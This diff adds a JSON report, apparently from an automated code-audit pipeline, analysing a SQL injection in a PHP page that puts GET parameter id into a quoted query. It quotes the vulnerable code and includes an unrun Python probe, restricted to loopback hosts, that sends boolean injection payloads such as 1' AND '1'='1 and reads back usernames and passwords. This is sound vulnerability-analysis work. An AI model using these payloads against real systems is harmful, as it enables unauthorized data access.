@@ -1,0 +1,145 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-001",
+  "input_version": "v2",
+  "prompt_version": "final-wp4-v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-001"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "medium",
+    "reason": "静态证据完整：GET id 在第8行直接赋值，第14行在单引号字符串上下文中拼接入 SQL，第15行直接 mysql_query 执行，且全文无参数化、无转义、无白名单；但连接实现 prefix、PHP/MySQL 版本与 magic_quotes_gpc 等运行条件未提供，且尚无实测证据，因此不升为 high。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-001-F1",
+      "vulnerability_type": "SQL注入（单引号字符串拼接，注入点 id）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 14,
+          "line_end": 14,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 20,
+          "line_end": 20,
+          "quote": "echo 'Your Login name:'. $row['username'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 28,
+          "line_end": 28,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "第6行 if(isset($_GET['id'])) 判定参数存在；第8行 $id=$_GET['id']; 直接取整个字符串值，无 trim、无类型校验、无白名单、无 addslashes/mysql_real_escape_string、无预处理绑定。",
+        "第10-12行 将 $id 追加写入 result.txt；仅为日志入口，与 SQL 构造无关，不计入本漏洞数据流；但未转义写入仍属测试观测点。",
+        "第14行 单引号字符串上下文直接拼接：形成 WHERE id='<id>' LIMIT 0,1；攻击者输入单引号即可结束字面量并插入任意 SQL 语句结构（布尔/联合/报错），值、结构未分离。",
+        "第15行 mysql_query($sql) 无任何预检、无绑定参数参与执行；即拼接后的字符串直接下发数据库。",
+        "第16-24行 成功时输出 $row['username'] 与 $row['password']（第20、22行），为可观察的业务结果区；第27-28行 失败时 print_r(mysql_error()) 输出 SQL 错误文本，为错误对照点。",
+        "第4行 error_reporting(0) 仅屏蔽 PHP 警告，不影响 mysql_error() 的主动回显，也不构成任何输入防护。"
+      ],
+      "principle": "用户输入从 GET 参数 id 直接赋值给 $id，在第14行以双引号字符串拼接方式嵌入单引号引用的 SQL 字面量，未使用参数化，未针对字符集与引用方式转义。因此控制值与 SQL 语句结构未分离：输入一个单引号即可提前结束 id 字符串，使 WHERE 子句变为恶意表达式（如恒真条件绕过、UNION 追加查询、布尔式探测）；查询结果在同一代码块第20/22行回显，形成可观察的语义变化。",
+      "impact": "可读取 security.users 表任意行的 username/password（第20、22行回显），实现账号信息泄露；通过 UNION/子查询可扩展到同连接内其他表（需知列数与权限，未验证）；通过布尔假条件可逐位探测；mysql_error() 回显（第28行）还可泄露 SQL 结构与库名/表名。未见写操作，未评估写入影响。",
+      "preconditions": [
+        "部署环境中该文件可通过 HTTP GET 访问，且 id 参数未被上游代理/框架过滤。",
+        "../sql-connections/sql-connect.php 存在且成功连接 security 库，users 表存在且含 id/username/password 列（第14行 SELECT *，第20/22行使用 username/password）。",
+        "PHP 引擎与 mysql_* 接口兼容（PHP 7+ 需 mysql_* 兼容层），否则第15行会因未定义函数而致命，漏洞不可观测。",
+        "运行时未开启会自动转义引号的全局机制（如旧版 magic_quotes_gpc），且页面不要求先登录。",
+        "数据库中存在 id=1 的记录作为基准行，以便分辨正常行与假条件空行。"
+      ],
+      "counterexamples": [
+        "若运行环境开启了 magic_quotes_gpc（旧 PHP）或入口前置了全局 addslashes/mysql_real_escape_string，第14行拼接到的单引号会被转义，引号无法结束字面量，该路径不成立（但本文件内无任何这类代码）。",
+        "若 PHP 版本移除了 mysql_* 且无兼容层，第15行直接报“Call to undefined function mysql_query()”，此时无法通过行渲染观察漏洞；这属环境不兼容，不等于存在防护。",
+        "若服务器前置 WAF/代理拦截并拒绝单引号等特征字符，请求未到达该代码，本段代码层面的漏洞仍存在但实测不可触发。",
+        "若 users 表为空或 id=1 不存在，基准行不渲染，观察区未验证，布尔差分无法判定（需先确认数据集）。",
+        "若 id 参数名或请求方法与本模块不一致（如实际路由拆包后改名），需人工核对第6/8行入口，不能直接套用。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python3",
+        "code": "#!/usr/bin/env python3\n\"\"\"SQLI-001 local boolean-differential verification draft.\n\nTarget code path (normalized_samples/SQLI-001.php, local line numbers):\n   8  : $id=$_GET['id'];\n  14  : $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n  15  : $result=mysql_query($sql);\n  16  : $row = mysql_fetch_array($result);\n  20  : echo 'Your Login name:'. $row['username'];\n  22  : echo 'Your Password:' .$row['password'];\n  28  : print_r(mysql_error());\n\nSafety: loopback targets only, redirects refused, GET only, boolean\ncomparison only - no enumeration, no data export, no writes.\n\"\"\"\n\nimport argparse\nimport http.cookiejar\nimport json\nimport re\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\n\nLOGIN_RE = re.compile(r\"Your Login name:\\s*([^<\\r\\n]*)\")\nPASS_RE = re.compile(r\"Your Password:\\s*([^<\\r\\n]*)\")\nSQL_ERR_RE = re.compile(\n    r\"(You have an error in your SQL syntax|check the manual|Warning:\\s*mysql_)\",\n    re.IGNORECASE,\n)\nIFACE_ERR_RE = re.compile(\n    r\"(undefined function\\s+mysql_|Call to undefined function)\", re.IGNORECASE\n)\n\n\ndef die(msg):\n    print(\"PRECONDITION_FAILURE: \" + msg)\n    sys.exit(2)\n\n\ndef parse_target(base_url):\n    parts = urllib.parse.urlsplit(base_url)\n    if parts.scheme not in (\"http\", \"https\"):\n        die(\"base URL must be http(s), got scheme %r\" % parts.scheme)\n    host = (parts.hostname or \"\").lower()\n    if host not in ALLOWED_HOSTS:\n        die(\"refusing non-loopback host %r; widen ALLOWED_HOSTS only for an authorized lab\" % host)\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef build_opener(cookie_file):\n    handlers = [NoRedirect()]\n    if cookie_file:\n        jar = http.cookiejar.MozillaCookieJar(cookie_file)\n        try:\n            jar.load(ignore_discard=True, ignore_expires=True)\n        except OSError as exc:\n            die(\"cannot load cookie file: %s\" % exc)\n    else:\n        jar = http.cookiejar.CookieJar()\n    handlers.append(urllib.request.HTTPCookieProcessor(jar))\n    return urllib.request.build_opener(*handlers)\n\n\ndef request_once(opener, base_url, path, name, value, timeout):\n    url = base_url.rstrip(\"/\") + path\n    query = urllib.parse.urlencode({name: value})\n    req = urllib.request.Request(url + \"?\" + query, method=\"GET\")\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            body = resp.read().decode(\"utf-8\", \"replace\")\n            return {\"status\": resp.status, \"url\": resp.geturl(), \"body\": body}\n    except urllib.error.HTTPError as exc:\n        body = exc.read().decode(\"utf-8\", \"replace\") if exc.fp else \"\"\n        return {\"status\": exc.code, \"url\": url, \"body\": body}\n    except urllib.error.URLError as exc:\n        return {\"status\": None, \"url\": url, \"body\": \"\", \"error\": str(exc.reason)}\n\n\ndef observe(result):\n    body = result[\"body\"]\n    login = LOGIN_RE.search(body)\n    password = PASS_RE.search(body)\n    return {\n        \"status\": result[\"status\"],\n        \"login_name\": login.group(1).strip() if login else None,\n        \"password\": password.group(1).strip() if password else None,\n        \"row_rendered\": login is not None,\n        \"sql_error_text\": bool(SQL_ERR_RE.search(body)),\n        \"php_iface_error\": bool(IFACE_ERR_RE.search(body)),\n        \"transport_error\": result.get(\"error\"),\n    }\n\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"SQLI-001 boolean differential draft\")\n    ap.add_argument(\"--base-url\", required=True, help=\"e.g. http://127.0.0.1:8080\")\n    ap.add_argument(\"--path\", required=True,\n                    help=\"deployed path of the file whose source is normalized_samples/SQLI-001.php\")\n    ap.add_argument(\"--param\", default=\"id\", help=\"GET parameter name taken from code (default: id)\")\n    ap.add_argument(\"--cookie-file\", default=None,\n                    help=\"optional Netscape cookie file; never printed\")\n    ap.add_argument(\"--timeout\", type=float, default=10.0)\n    args = ap.parse_args()\n\n    parse_target(args.base_url)\n    opener = build_opener(args.cookie_file)\n\n    probes = [\n        (\"normal\", \"1\"),\n        (\"true_condition\", \"1' AND '1'='1\"),\n        (\"false_condition\", \"1' AND '1'='2\"),\n        (\"syntax_error_control\", \"1'\"),\n    ]\n\n    results = {}\n    for label, payload in probes:\n        raw = request_once(opener, args.base_url, args.path, args.param, payload, args.timeout)\n        results[label] = observe(raw)\n        print(\"[%s] %s\" % (label, json.dumps(results[label], ensure_ascii=False)))\n\n    normal = results[\"normal\"]\n    tru = results[\"true_condition\"]\n    fal = results[\"false_condition\"]\n    err = results[\"syntax_error_control\"]\n\n    if normal[\"transport_error\"] or normal[\"status\"] is None:\n        die(\"baseline request failed: %s\" % normal[\"transport_error\"])\n    if normal[\"status\"] in (301, 302, 303, 307, 308):\n        die(\"baseline redirected (HTTP %s): auth/session precondition failed, not a filter\" % normal[\"status\"])\n    if normal[\"php_iface_error\"]:\n        die(\"mysql_* interface unavailable on this PHP build: environment failure, not a filter\")\n    if not normal[\"row_rendered\"]:\n        die(\"baseline id=1 rendered no 'Your Login name:' row; observation area unvalidated \"\n            \"(check dataset row, path and parameter name)\")\n\n    differential = (\n        tru[\"row_rendered\"]\n        and not tru[\"sql_error_text\"]\n        and tru[\"login_name\"] == normal[\"login_name\"]\n        and not fal[\"row_rendered\"]\n        and not fal[\"sql_error_text\"]\n        and err[\"sql_error_text\"]\n    )\n\n    summary = {\n        \"normal_row_present\": normal[\"row_rendered\"],\n        \"true_row_present\": tru[\"row_rendered\"],\n        \"true_matches_normal\": tru[\"login_name\"] == normal[\"login_name\"],\n        \"false_row_absent\": not fal[\"row_rendered\"],\n        \"false_has_no_sql_error\": not fal[\"sql_error_text\"],\n        \"syntax_control_produces_error\": err[\"sql_error_text\"],\n        \"differential_observed\": differential,\n    }\n    print(json.dumps(summary, ensure_ascii=False))\n\n    if differential:\n        print(\"RESULT: boolean differential observed (quote break reached MySQL as valid SQL and \"\n              \"changed row rendering, while the malformed control raised a syntax error). \"\n              \"Repeat once with a second normal id (e.g. 2) before recording confirmation.\")\n        return 0\n    if fal[\"row_rendered\"]:\n        print(\"RESULT: no differential - FALSE payload still rendered a row; input may be escaped \"\n              \"or the dataset row differs. This is not proof of safety.\")\n        return 1\n    print(\"RESULT: inconclusive - review the probe lines above.\")\n    return 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+",
+          "仅标准库：argparse, http.cookiejar, json, re, sys, urllib",
+          "无第三方库依赖"
+        ],
+        "parameters": [
+          "--base-url：目标基址，仅允许 localhost/127.0.0.1/::1，如 http://127.0.0.1:8080",
+          "--path：部署后对应 normalized_samples/SQLI-001.php 的请求路径（本代码因 include '../sql-connections/sql-connect.php' 无法推断实际部署路径，需人工填写）",
+          "--param：GET 参数名，默认 id（来自第8行 $_GET['id']）",
+          "--cookie-file：可选，Netscape 格式会话文件，不打印内容；无需登录时可不传",
+          "--timeout：单请求超时秒数，默认 10"
+        ],
+        "steps": [
+          "确认已授权的本地靶场与部署路径，将 --base-url 设为 loopback 地址，--path 设为该文件的实际部署路径。",
+          "可选：在浏览器中登录后导出 Netscape cookie 文件，以 --cookie-file 传入；若该页无需认证则省略。脚本不输出 cookie 内容。",
+          "运行：python3 sqli001_probe.py --base-url http://127.0.0.1:8080 --path <实际部署路径> --param id --timeout 10；--path 必须取自本次部署清单（第3行为相对 include，无法推断），不得套用其他样本、其他框架或其他关卡的路径名。",
+          "阅读四行 [label] 输出：normal（id=1）、true_condition（id=1' AND '1'='1）、false_condition（id=1' AND '1'='2）、syntax_error_control（id=1'）。",
+          "若基线 normal 未渲染 'Your Login name:' 行，脚本以退出码 2 报 PRECONDITION_FAILURE；先排查数据集、路径、参数名，不得当作防护生效。",
+          "若真条件与基线行同值且无 SQL 错误，而假条件无 'Your Login name:' 且无 SQL 错误，且语法错误对照项出现错误文本，则为存在差分信号；建议换另一个已知行（如 id=2）复测一次后再记录。",
+          "若需记录结果，保存原始命令、环境（PHP/MySQL 版本、靶场提交）、四次请求与响应体；不得将 HTTP 200 或单次请求当成确认证据。"
+        ],
+        "expected_observation": "同一会话内四次 GET（参数名 id）的业务结果区差异：(A) id=1 → 响应体出现 'Your Login name:<非空用户名>' 与 'Your Password:<非空口令>'（对应第20/22行正常行）；(B) id=1' AND '1'='1 → 与 (A) 相同的用户名/口令值，且响应中无 SQL 错误文本（真条件命中行）；(C) id=1' AND '1'='2 → 无 'Your Login name:' 标记，仅剩 <font color= \"#FFFF00\"></font> 空块，且无 SQL 错误文本（假条件空行；语法有效，第16行返回空结果进入第27-30行 else 分支，mysql_error() 为空）；(D) id=1' → 出现 'You have an error in your SQL syntax' 类错误文本（第28行 print_r(mysql_error())），作为语法错误对照，用以证明 (C) 的空行不是语法错误。脚本以正则从响应体提取 'Your Login name:' 后的字段值并比较，不依赖 HTTP 状态码、响应长度或哈希。",
+        "success_criteria": "1) 基线有效性：同会话 id=1 响应体中正则提取到非空 login_name 且无 transport/redirect/PHP 接口错误（否则属前置条件失败，不得得出防护结论）；2) 真条件命中：id=1' AND '1'='1 提取到的 login_name 与基线相同，且响应中无 SQL 错误文本；3) 假条件空行：id=1' AND '1'='2 响应中不出现 'Your Login name:' 标记，且同样无 SQL 错误文本（证明语句语法有效但语义被改变）；4) 语法错误对照：id=1' 响应中出现 SQL 语法错误文本，与第3步的无错误空行形成对比；5) 上述 1-4 同时成立时才记为“存在布尔差分信号”；仅 HTTP 200、仅一次请求、仅页面回显或仅脚本退出码 0 均不能代替上述任一条；确认需再次独立复测与环境记录。",
+        "limitations": [
+          "本次未运行：无部署环境、无真实响应体，无法确认数据库中 id=1 是否存在。",
+          "请求路径与基址需人工填写：脚本不内置任何具体路径，<实际部署路径> 必须取自部署清单。",
+          "仅验证布尔差分；未测 UNION 列数（users 表列数未提供），不枚举库名/表名，不导出数据。",
+          "PHP 与 MySQL 版本未知；若 mysql_* 不可用则脚本以 PRECONDITION_FAILURE 退出，该结果属环境失败而非漏洞不存在。",
+          "反向校验受限：若实际环境开启了 magic_quotes 类全局转义，本脚本只能给出“未观察到差分”，不能反过来证明源码安全。",
+          "脚本随 JSON 内联提供，artifact_path 为 null，实跑前需先落盘为 .py 并做语法检查。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "../sql-connections/sql-connect.php 连接实现未提供：连接的库名、字符集、用户权限与是否存在转义层未知。",
+    "db-creds.inc 与 security 库初始化状态未提供，users 表实际列结构与行数未知。",
+    "实际部署路径、web 服务器与是否需登录未提供（此文件不能独立部署）。",
+    "PHP 与 MySQL 版本未知；mysql_* 是否可用、是否开启 magic_quotes_gpc 均未确认。",
+    "是否存在 WAF/代理/框架级全局过滤未提供。",
+    "line_maps/SQLI-001.csv 未提供，本文所用行号为标准化代码块的局部行号（1 起始），未映射到原始存储文件。",
+    "未提供任何实测运行记录，无法核实语义变化。"
+  ],
+  "risk_notes": [
+    "$id 在第10-12行未转义追加写入 result.txt；属日志写入/伪造与潜在信息泄露风险，与 SQL 注入分开计。",
+    "第20、22行将 username/password 明文回显到页面，属敏感信息暴露风险，即使修复注入仍存在。",
+    "第28行将 mysql_error() 直接回显，可泄露 SQL 语句结构、库名与表名，助推注入利用。"
+  ],
+  "quality_notes": [
+    "使用已废弃的 mysql_* 接口（第15行 mysql_query、第16行 mysql_fetch_array、第28行 mysql_error），PHP 7+ 默认不可用。",
+    "第16行未检查 mysql_query 返回值就传入 mysql_fetch_array，查询失败时会产生警告（被第4行 error_reporting(0) 屏蔽）。",
+    "第4行 error_reporting(0) 与第28行 print_r(mysql_error()) 并存：警告被隐藏但错误文本仍回显，排查信号不一致。",
+    "id 参数未做类型校验（页面文案提示 numeric value，但代码未校验），页面文案不构成服务端保护。"
+  ],
+  "limitations": [
+    "仅基于所给单个代码片段的静态审计，未运行任何请求，无运行证据。",
+    "本次仅收到 SQLI-001 一个包（1/1），已按父样本综合输出；不存在跨包重复计数问题。",
+    "第3行 include 的连接实现未提供，无法确认连接字符集、用户权限与隐含转义。",
+    "未知漏洞利用的列数与数据库权限，UNION 可达范围不得而知；本文仅就已证实的拼接路径下结论。",
+    "POC 仅为未运行的人工适配草案，且代码仅在 JSON 中内联保存（artifact_path 为 null）。"
+  ],
+  "runtime_evidence": []
+}
